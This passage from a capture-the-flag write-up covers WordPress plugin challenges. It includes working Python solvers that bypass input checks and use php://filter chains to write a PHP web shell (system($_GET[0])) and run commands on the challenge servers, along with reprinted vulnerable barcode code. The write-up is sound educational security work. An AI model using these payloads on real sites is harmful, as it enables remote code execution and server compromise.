            echo "blocked";
            exit(); 
        }

        if(strlen($name) > 105){
            echo "blocked.";
            exit();
        }
        
        $write = <<<EOF
            <?php
                exit('ha?');
                // $content

        EOF;

        file_put_contents($name . '.php', $write);
        return rest_ensure_response( "success" );
    }
    ```

To get RCE (Remote Code Execution), there are two things in the plugin we need to bypass. The first is the `$some_value` checker here:

```php
    $some_value = trim( strtolower( $request['somevalue'] ) );
    if( empty( $some_value ) ) {
       return false;
    }
 
    if( ! preg_match( '/^secretword_/i', $some_value) ) {
       return false;
    }
 
    if( $some_value == 'secretword_is_true' ) {
       return false;
    }
    return true;
    ...snip...
    $body = $request->get_json_params();
    $content = $body['content'];
    $name = $body['name'];
    $some_value = trim( strtolower( $request['somevalue'] ) );
    if(!get_option($some_value)){
        echo "blocked";
        exit(); 
    }

```

The second is the PHP `exit` here:

```php
    $write = <<<EOF
        <?php
            exit('ha?');
            // $content

    EOF;

    file_put_contents($name . '.php', $write);
    return rest_ensure_response( "success" );
```

For the first bypass, we can use the fact that parameters in the URL (`'/upload/(?P<somevalue>\w+)'`) can be passed via URL parameters, JSON, or the request body. Interestingly, it will match not only by its regex `\w+` but will match all its values. This behavior might be due to the plugin getting the `somevalue` by using an array (`$request['somevalue']`), which will get the value from URL parameters, JSON, or the request body. So, we just need to pass something like `\x01` in the `somevalue`, and it will bypass all the checks.

For the second bypass, we can use a PHP filter because we can directly influence the start of `file_put_contents` using `$name`. In this case, we will use UTF-8 to UTF-16BE, as shown in the solution below.

## Solver

```python
import httpx
import asyncio
URL = "http://52.77.81.199:9199/"
class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)

class API(BaseAPI):
    async def upload_something(self, content: str, name: str) -> None:
        data = {
            "content": content,
            "name": name
        }
        return await self.c.post("/wp-json/test/upload/x", params={"somevalue": "secretword_is_true\x01"}, json=data)
    def get_shell(self, cmd):
        return self.c.get("/wp-content/uploads/x.php", params={"0": cmd})
async def main():
    api = API()
    res = await api.upload_something(
        content=b" <?php system($_GET[0]);?>".decode('utf-16-be'),
        name="php://filter/convert.iconv.UTF8.UTF-16BE/resource=/var/www/html/wp-content/uploads/x"
    )
    res = await api.get_shell("cat /*")
    print(res.text)

if __name__ == "__main__":
    asyncio.run(main())
 
```

### Flag

![](./imgs/image_dxH47Wup.png)

# **Sneaky**

| Solves | 5 |
| ------ | - |

Description

    You sneaky ...

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/c534e31b-0795-4183-a2e6-22588ecc2676/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466X7427A6T%2F20250524%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250524T044419Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEUaCXVzLXdlc3QtMiJIMEYCIQDuZoacMzqA6DhxHgJUq4y8vkUrI3mUTQh5aBiEc2xwjgIhANp8ecPE2EvJeCs14ORw9igt%2FwUsDQBw9MsRZ9VL6RV4KogECP3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgyI%2BcAdHOBBhy2qxeIq3AMZU0dLfsb5yoPOAcWB2UzRyZ4W68x1a%2FGoOmwc341ZU1j3is512q2kPF%2BUTkEznAC79r26ySxRfhPVn1WPs05YkBphMf1xiK1ia3Ijpf1niwKYBi3SQ5952RuBO2BOmjUw8flNYvEaE6%2Ffv0Oo0wdsQ%2Fk7NjXx0ILLo2iyQ9HpiH3WHf3b%2BOEAEG0CAdgaRJuSDqWqjY60OOBfwewo%2F6n%2Bkt0ff7G1EqFiMXuObxO09xhx1eqJIalDzbCdcHUp6UWsh2tNgFqirlmXsazylsjhme3X6WUNzcY087xtv9nqUflPemdT6myc%2FaoUONv4R2adR1patta9O2JSDzfx8UJ9On4P02qktZRQKu39aj5jx6Km8fuWXq6DtI9U8rxlsjawLnQsFa2rObmjJTNqtqWxZuy4qUaGUjYD%2FDh4Bc%2Fh1HcqMZmmxLuiipVUfYsmMQ1iVj222KTqFQGIoaP9vD1QY%2FS4r9Xl3L9TNz2fYkfiIOYuvUvv08LsvUEm%2BNNFaUPkmsQ%2Fd2jSwCMZdgbRLlQnJFBGVvkI2jLWoyTXByT4RpNRsr5Epck5fL5m1llpzyrpAK8zYEVMsOYgtFvDf1XcZpioO2cv7RxrTeBpVlAtu6gdwq328kIfvDO6ljDAksXBBjqkAbSFz5KHrB7UIkEp%2FWYPeNlrrjvbBZm2z7K%2FztaIZNNjCgXexSOPWmeeuh1CNJh5%2BMreNH6jXVSqZxnBNSN5NzTZZYkxW3xBhDcV%2F0iX7xJ4fGyNKS9EICtzqhsI%2F50Fuye008j1f3zaOB5UdmEMSJpolkBfsuy6iwj3HrrUX%2FJgZZcsHLwSpkn%2BWY3DLX%2BtBIZpUcicKuN8imAqH6tmhaiotZeV&X-Amz-Signature=43e0e12184f7b14f3cc2874d38a4537706286a36d770461a7f19c2a1cb540189&X-Amz-SignedHeaders=host&x-id=GetObject)

References

    - [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

***

In this challenge, we will exploit a PHP filter chain in the `imagepng($image, $filename)` function, where the `$filename` is a variable that we can fully control.

When we look at the source code in `server-given/docker/wordpress/toolbox/plugins/mwb-point-of-sale-pos-for-woocommerce/package/lib/php-barcode-master/barcode.php`, we can see the following:

barcode.php

    ```php
    <?php
    /**
     *  Author  David S. Tufts
     *  Company davidscotttufts.com
     *
     *  Date:   05/25/2003
     *  Usage:  <img src="/barcode.php?text=testing" alt="testing" />
     *
     *  @package    Ultimate_Woocommerce_Gift_Card
     */

    /*
     For demonstration purposes, get pararameters that are passed in through $_GET or set to the default value. */
     $filepath = isset( $_GET['filepath'] ) ? $_GET['filepath']  : '';
     $text = isset( $_GET['text'] ) ? $_GET['text']  : '0';
     $size = isset( $_GET['size'] ) ? $_GET['size']  : '20';
     $orientation = isset( $_GET['orientation'] ) ? $_GET['orientation']  : 'horizontal';
     $code_type = isset( $_GET['codetype'] ) ? $_GET['codetype']  : 'code128';
     $print = isset( $_GET['print'] ) && ( 'true' == $_GET['print'] )  ? true : false;
     $sizefactor = isset( $_GET['sizefactor'] ) ? $_GET['sizefactor'] : '1';

    barcode( $filepath, $text, $size , $orientation , $code_type , $print , $sizefactor );
    /**
     * This function call can be copied into your project and can be made from anywhere in your code.
     *
     * @param string  $filepath Filepath.
     * @param string  $text Text.
     * @param string  $size Size.
     * @param string  $orientation Orientation.
     * @param string  $code_type Code Type.
     * @param boolean $print Print.
     * @param integer $size_factor Size factor.
     * @return void
     */
    function barcode( $filepath = '', $text = '0', $size = '20', $orientation = 'horizontal', $code_type = 'code128', $print = false, $size_factor = 1 ) {
    	$code_string = '';
    	// Translate the $text into barcode the correct $code_type.
    	if ( in_array( strtolower( $code_type ), array( 'code128', 'code128b' ) ) ) {
    		$chksum = 104;
    		// Must not change order of array elements as the checksum depends on the array's key to validate final code.
    		$code_array = array(
    			' ' => '212222',
    			'!' => '222122',
    			'"' => '222221',
    			'#' => '121223',
    			'$' => '121322',
    			'%' => '131222',
    			'&' => '122213',
    			"'" => '122312',
    			'(' => '132212',
    			')' => '221213',
    			'*' => '221312',
    			'+' => '231212',
    			',' => '112232',
    			'-' => '122132',
    			'.' => '122231',
    			'/' => '113222',
    			'0' => '123122',
    			'1' => '123221',
    			'2' => '223211',
    			'3' => '221132',
    			'4' => '221231',
    			'5' => '213212',
    			'6' => '223112',
    			'7' => '312131',
    			'8' => '311222',
    			'9' => '321122',
    			':' => '321221',
    			';' => '312212',
    			'<' => '322112',
    			'=' => '322211',
    			'>' => '212123',
    			'?' => '212321',
    			'@' => '232121',
    			'A' => '111323',
    			'B' => '131123',
    			'C' => '131321',
    			'D' => '112313',
    			'E' => '132113',
    			'F' => '132311',
    			'G' => '211313',
    			'H' => '231113',
    			'I' => '231311',
    			'J' => '112133',
    			'K' => '112331',
    			'L' => '132131',
    			'M' => '113123',
    			'N' => '113321',
    			'O' => '133121',
    			'P' => '313121',
    			'Q' => '211331',
    			'R' => '231131',
    			'S' => '213113',
    			'T' => '213311',
    			'U' => '213131',
    			'V' => '311123',
    			'W' => '311321',
    			'X' => '331121',
    			'Y' => '312113',
    			'Z' => '312311',
    			'[' => '332111',
    			'\\' => '314111',
    			']' => '221411',
    			'^' => '431111',
    			'_' => '111224',
    			'\`' => '111422',
    			'a' => '121124',
    			'b' => '121421',
    			'c' => '141122',
    			'd' => '141221',
    			'e' => '112214',
    			'f' => '112412',
    			'g' => '122114',
    			'h' => '122411',
    			'i' => '142112',
    			'j' => '142211',
    			'k' => '241211',
    			'l' => '221114',
    			'm' => '413111',
    			'n' => '241112',
    			'o' => '134111',
    			'p' => '111242',
    			'q' => '121142',
    			'r' => '121241',
    			's' => '114212',
    			't' => '124112',
    			'u' => '124211',
    			'v' => '411212',
    			'w' => '421112',
    			'x' => '421211',
    			'y' => '212141',
    			'z' => '214121',
    			'{' => '412121',
    			'|' => '111143',
    			'}' => '111341',
    			'~' => '131141',
    			'DEL' => '114113',
    			'FNC 3' => '114311',
    			'FNC 2' => '411113',
    			'SHIFT' => '411311',
    			'CODE C' => '113141',
    			'FNC 4' => '114131',
    			'CODE A' => '311141',
    			'FNC 1' => '411131',
    			'Start A' => '211412',
    			'Start B' => '211214',
    			'Start C' => '211232',
    			'Stop' => '2331112',
    		);
    		$code_keys = array_keys( $code_array );
    		$code_values = array_flip( $code_keys );
    		$text_length = strlen( $text );
    		for ( $x = 1; $x <= $text_length; $x++ ) {
    			$active_key = substr( $text, ( $x - 1 ), 1 );
    			$code_string .= $code_array[ $active_key ];
    			$chksum = ( $chksum + ( $code_values[ $active_key ] * $x ) );
    		}
    		$code_string .= $code_array[ $code_keys[ ( $chksum - ( intval( $chksum / 103 ) * 103 ) ) ] ];

    		$code_string = '211214' . $code_string . '2331112';
    	} elseif ( 'code128a' == strtolower( $code_type ) ) {
    		$chksum = 103;
    		$text = strtoupper( $text ); // Code 128A doesn't support lower case.
    		// Must not change order of array elements as the checksum depends on the array's key to validate final code.
    		$code_array = array(
    			' ' => '212222',
    			'!' => '222122',
    			'"' => '222221',
    			'#' => '121223',
    			'$' => '121322',
    			'%' => '131222',
    			'&' => '122213',
    			"'" => '122312',
    			'(' => '132212',
    			')' => '221213',
    			'*' => '221312',
    			'+' => '231212',
    			',' => '112232',
    			'-' => '122132',
    			'.' => '122231',
    			'/' => '113222',
    			'0' => '123122',
    			'1' => '123221',
    			'2' => '223211',
    			'3' => '221132',
    			'4' => '221231',
    			'5' => '213212',
    			'6' => '223112',
    			'7' => '312131',
    			'8' => '311222',
    			'9' => '321122',
    			':' => '321221',
    			';' => '312212',
    			'<' => '322112',
    			'=' => '322211',
    			'>' => '212123',
    			'?' => '212321',
    			'@' => '232121',
    			'A' => '111323',
    			'B' => '131123',
    			'C' => '131321',
    			'D' => '112313',
    			'E' => '132113',
    			'F' => '132311',
    			'G' => '211313',
    			'H' => '231113',
    			'I' => '231311',
    			'J' => '112133',
    			'K' => '112331',
    			'L' => '132131',
    			'M' => '113123',
    			'N' => '113321',
    			'O' => '133121',
    			'P' => '313121',
    			'Q' => '211331',
    			'R' => '231131',
    			'S' => '213113',
    			'T' => '213311',
    			'U' => '213131',
    			'V' => '311123',
    			'W' => '311321',
    			'X' => '331121',
    			'Y' => '312113',
    			'Z' => '312311',
    			'[' => '332111',
    			'\\' => '314111',
    			']' => '221411',
    			'^' => '431111',
    			'_' => '111224',
    			'NUL' => '111422',
    			'SOH' => '121124',
    			'STX' => '121421',
    			'ETX' => '141122',
    			'EOT' => '141221',
    			'ENQ' => '112214',
    			'ACK' => '112412',
    			'BEL' => '122114',
    			'BS' => '122411',
    			'HT' => '142112',
    			'LF' => '142211',
    			'VT' => '241211',
    			'FF' => '221114',
    			'CR' => '413111',
    			'SO' => '241112',
    			'SI' => '134111',
    			'DLE' => '111242',
    			'DC1' => '121142',
    			'DC2' => '121241',
    			'DC3' => '114212',
    			'DC4' => '124112',
    			'NAK' => '124211',
    			'SYN' => '411212',
    			'ETB' => '421112',
    			'CAN' => '421211',
    			'EM' => '212141',
    			'SUB' => '214121',
    			'ESC' => '412121',
    			'FS' => '111143',
    			'GS' => '111341',
    			'RS' => '131141',
    			'US' => '114113',
    			'FNC 3' => '114311',
    			'FNC 2' => '411113',
    			'SHIFT' => '411311',
    			'CODE C' => '113141',
    			'CODE B' => '114131',
    			'FNC 4' => '311141',
    			'FNC 1' => '411131',
    			'Start A' => '211412',
    			'Start B' => '211214',
    			'Start C' => '211232',
    			'Stop' => '2331112',
    		);
    		$code_keys = array_keys( $code_array );
    		$code_values = array_flip( $code_keys );
    		$text_length = strlen( $text );
    		for ( $x = 1; $x <= $text_length; $x++ ) {
    			$active_key = substr( $text, ( $x - 1 ), 1 );
    			$code_string .= $code_array[ $active_key ];
    			$chksum = ( $chksum + ( $code_values[ $active_key ] * $x ) );
    		}
    		$code_string .= $code_array[ $code_keys[ ( $chksum - ( intval( $chksum / 103 ) * 103 ) ) ] ];

    		$code_string = '211412' . $code_string . '2331112';
    	} elseif ( strtolower( $code_type ) == 'code39' ) {
    		$code_array = array(
    			'0' => '111221211',
    			'1' => '211211112',
    			'2' => '112211112',
    			'3' => '212211111',
    			'4' => '111221112',
    			'5' => '211221111',
    			'6' => '112221111',
    			'7' => '111211212',
    			'8' => '211211211',
    			'9' => '112211211',
    			'A' => '211112112',
    			'B' => '112112112',
    			'C' => '212112111',
    			'D' => '111122112',
    			'E' => '211122111',
    			'F' => '112122111',
    			'G' => '111112212',
    			'H' => '211112211',
    			'I' => '112112211',
    			'J' => '111122211',
    			'K' => '211111122',
    			'L' => '112111122',
    			'M' => '212111121',
    			'N' => '111121122',
    			'O' => '211121121',
    			'P' => '112121121',
    			'Q' => '111111222',
    			'R' => '211111221',
    			'S' => '112111221',
    			'T' => '111121221',
    			'U' => '221111112',
    			'V' => '122111112',
    			'W' => '222111111',
    			'X' => '121121112',
    			'Y' => '221121111',
    			'Z' => '122121111',
    			'-' => '121111212',
    			'.' => '221111211',
    			' ' => '122111211',
    			'$' => '121212111',
    			'/' => '121211121',
    			'+' => '121112121',
    			'%' => '111212121',
    			'*' => '121121211',
    		);

    		// Convert to uppercase.
    		$upper_text = strtoupper( $text );

    		$upper_text_length = strlen( $upper_text );
    		for ( $x = 1; $x <= $upper_text_length; $x++ ) {
    			$code_string .= $code_array[ substr( $upper_text, ( $x - 1 ), 1 ) ] . '1';
    		}

    		$code_string = '1211212111' . $code_string . '121121211';
    	} elseif ( strtolower( $code_type ) == 'code25' ) {
    		$code_array1 = array( '1', '2', '3', '4', '5', '6', '7', '8', '9', '0' );
    		$code_array2 = array( '3-1-1-1-3', '1-3-1-1-3', '3-3-1-1-1', '1-1-3-1-3', '3-1-3-1-1', '1-3-3-1-1', '1-1-1-3-3', '3-1-1-3-1', '1-3-1-3-1', '1-1-3-3-1' );

    		$text_length = strlen( $text );
    		$count_array1 = count( $code_array1 );
    		for ( $x = 1; $x <= $text_length; $x++ ) {
    			for ( $y = 0; $y < $count_array1; $y++ ) {
    				if ( substr( $text, ( $x - 1 ), 1 ) == $code_array1[ $y ] ) {
    					$temp[ $x ] = $code_array2[ $y ];
    				}
    			}
    		}

    		$text_length = strlen( $text );
    		for ( $x = 1; $x <= $text_length; $x += 2 ) {
    			if ( isset( $temp[ $x ] ) && isset( $temp[ ( $x + 1 ) ] ) ) {
    				$count_temp1 = count( $temp1 );
    				$temp1 = explode( '-', $temp[ $x ] );
    				$temp2 = explode( '-', $temp[ ( $x + 1 ) ] );
    				for ( $y = 0; $y < $count_temp1; $y++ ) {
    					$code_string .= $temp1[ $y ] . $temp2[ $y ];
    				}
    			}
    		}

    		$code_string = '1111' . $code_string . '311';
    	} elseif ( strtolower( $code_type ) == 'codabar' ) {
    		$code_array1 = array( '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '$', ':', '/', '.', '+', 'A', 'B', 'C', 'D' );
    		$code_array2 = array( '1111221', '1112112', '2211111', '1121121', '2111121', '1211112', '1211211', '1221111', '2112111', '1111122', '1112211', '1122111', '2111212', '2121112', '2121211', '1121212', '1122121', '1212112', '1112122', '1112221' );

    		// Convert to uppercase.
    		$upper_text = strtoupper( $text );
    		$upper_text_length = strlen( $upper_text );
    		for ( $x = 1; $x <= $upper_text_length; $x++ ) {
    			$count_array1 = count( $code_array1 );
    			for ( $y = 0; $y < $count_array1; $y++ ) {
    				if ( substr( $upper_text, ( $x - 1 ), 1 ) == $code_array1[ $y ] ) {
    					$code_string .= $code_array2[ $y ] . '1';
    				}
    			}
    		}
    		$code_string = '11221211' . $code_string . '1122121';
    	}

    	// Pad the edges of the barcode.
    	$code_length = 20;
    	if ( $print ) {
    		$text_height = 30;
    	} else {
    		$text_height = 0;
    	}

    	$code_string_length = strlen( $code_string );
    	for ( $i = 1; $i <= $code_string_length; $i++ ) {
    		$code_length = $code_length + (int) ( substr( $code_string, ( $i - 1 ), 1 ) );
    	}

    	if ( 'horizontal' == strtolower( $orientation ) ) {
    		$img_width = $code_length * $size_factor;
    		$img_height = $size;
    	} else {
    		$img_width = $size;
    		$img_height = $code_length * $size_factor;
    	}

    	$image = imagecreate( $img_width, $img_height + $text_height );
    	$black = imagecolorallocate( $image, 0, 0, 0 );
    	$white = imagecolorallocate( $image, 255, 255, 255 );

    	imagefill( $image, 0, 0, $white );
    	var_dump($print);
    	if ( $print ) {
    		imagestring( $image, 5, 31, $img_height, $text, $black );
    	}

    	$location = 10;
    	$code_string_length = strlen( $code_string );
    	for ( $position = 1; $position <= $code_string_length; $position++ ) {
    		$cur_size = $location + ( substr( $code_string, ( $position - 1 ), 1 ) );
    		if ( 'horizontal' == strtolower( $orientation ) ) {
    			imagefilledrectangle( $image, $location * $size_factor, 0, $cur_size * $size_factor, $img_height, ( 0 == $position % 2 ? $white : $black ) );
    		} else {
    			imagefilledrectangle( $image, 0, $location * $size_factor, $img_width, $cur_size * $size_factor, ( 0 == $position % 2 ? $white : $black ) );
    		}
    		$location = $cur_size;
    	}

    	// Draw barcode to the screen or save in a file.
    	if ( '' == $filepath ) {
    		header( 'Content-type: image/png' );
    		imagepng( $image );
    		imagedestroy( $image );
    	} else {
    		imagepng( $image, $filepath );
    		imagedestroy( $image );
    	}
    }

    ```

We can see that it uses a function named `barcode`, which in the end will save the file using the `imagepng` function. The file will be saved to our user-inputted variable named `$filename`. We can inject this `$filename` using a PHP filter chain to control its output. I use these tools to generate the filters:

> [![favicon](./imgs/favicon_f8fO6Cee.svg) **GitHub**](https://github.com/synacktiv/php_filter_chain_generator)\
> Contribute to synacktiv/php\_filter\_chain\_generator development by creating an account on GitHub.\
> <https://github.com/synacktiv/php_filter_chain_generator>

## Solver

solver.py

    ```python
    import httpx
    import asyncio

    URL = "http://52.77.81.199:9108/"
    class BaseAPI:
        def __init__(self, url=URL) -> None:
            self.c = httpx.AsyncClient(base_url=url)

        def qrcode(self, filepath: str = '', text: str = '0', size: str = '20', 
                   orientation: str = 'horizontal', code_type: str = 'code128', 
                   print_option: bool = False, sizefactor: str = '1') -> None:
            return self.c.get("/wp-content/plugins/mwb-point-of-sale-pos-for-woocommerce/package/lib/php-barcode-master/barcode.php", params={
                "filepath": filepath,
                "text": text,
                "size": size,
                "orientation": orientation,
                "codetype": code_type,
                "print": 'true' if print_option else 'false',
                "sizefactor": sizefactor
            })

    class API(BaseAPI):
        def shell(self, cmd):
            return self.c.get("/wp-content/uploads/koko-analytics/sss.php", params={"0": cmd})

    async def main():
        api = API()
        # python3 filter.py --chain "<?php system(\$_GET[0]);?>"
        x = "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/var/www/html/wp-content/uploads/koko-analytics/sss.php"
        res = await api.qrcode(x, "xxx", print_option=False, code_type="code128a", size=1)
        res = await api.shell("cat /*")
        print(res.text)

    if __name__ == "__main__":
        asyncio.run(main())

    ```

### Flag

![](./imgs/image_gKss6j1t.png)

## Explanation

# **Up To You**

| Solves | 3 |
| ------ | - |

Description

    it's all up to you.

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/4c454296-d8a6-4eb2-abcc-0e74b46c41cc/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466U4PLIP7V%2F20250524%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250524T044423Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEUaCXVzLXdlc3QtMiJHMEUCIBLMH3qp8DYYtkgoRtxV%2BFXxG8FlxeoGeq5HqJ%2BcPlaEAiEApOi4Z9Ty4GG4HzmkHFvqufaArZz2yEN4rLV6URj7uCoqiAQI%2Ff%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDL54Os1UJY6zVnIptSrcA0MXvvtDNGwYmszTB0qNvk0Vfpz9ETiYs4KFsfVjLYjpcsuJq4BC%2F4yCK%2BwHwHIgUK9Qvnp4LdYV8PlKtaadVcARO2z6Yz5dOE%2FoXhEZXFCSvky1MTi8ah%2B1IV5Z82xlH8bBOZs%2BgjcQBnRXFI%2B30cz%2BWm7Ls6klcYs8R4lWBNaobFKN2jX7ihgEVwgYT5y29H2deUmlkwfweZaGCo6uuj03JKSXKzclXYik2l2Rj5Ntvj81QfVUh0fJwN930owSqmHvu5ZV671fgbSPXC8aNmAyy%2F1%2Bf%2BUUvJxV8EmKxWDufMFJh8XotVN8%2FKz1P6NGflq4uVmoG6tyOsyVRLGKUlnEn3%2BzQ4pqZ30ESsVTm1SyHbCIswy%2B1fjoBVI5uEYfz%2BvyE0M9Wzng%2FWPQKr5F1KI3GQLTdakcr8hIzNOvubEy7%2B3Vq0XowKLHal7kxN72EA9ObJqjQCRiou%2BaJLnBkDeRL1c0TOHMALcKMn5tzxjO%2FDCJCPCq61VLxPyFF2k%2FPgUDDI1eMYZNdgblWILGGEnx6%2FKKkMcDJleCbOGyZ1nlx4R5u2YurA1wdnJsg6Li3bIB566%2BE06Fj9LWSD%2Bpi7Da0oMXAIv%2FKLdFBPhSR6IEtG9YXo1KAnVxipptMMySxcEGOqUBNp2%2F%2FFtM5lYUR7Fs6sMhq3H8GNH3MRWjQ4VcavEFbCfgqTY1vpkboe0ppXy46dNoX4s1c%2FcKf80RAPSYnP7Ih6ZdHnPJbwBMpSi3yZzVI9V6Ce6M%2BX4H02vtedyVHWAqeOGhe0fsCtatWgVnpT0S12wzzQjp4zOpHvdLBoSFh%2FHIqFi5CYQZtiQw8TFf6WVHcaumiVBjNs3p8Mr2L%2FYUbAu%2FbXNn&X-Amz-Signature=7eeeeb0dec23ed720b77a751bc31acd4f2b43ddb06c4c56ad1a494c462d67b32&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

In this challenge, we will exploit two vulnerabilities. The first one is a WordPress option update vulnerability, and the second one is an IDOR vulnerability.

For the first vulnerability, we can easily identify it by reading the plugin source code here:

test-plugin.php

    ```php
    add_action("wp_ajax_nopriv_uptoyou", "uptoyou");

    function uptoyou(){
        $option_name = $_POST["option_name"];
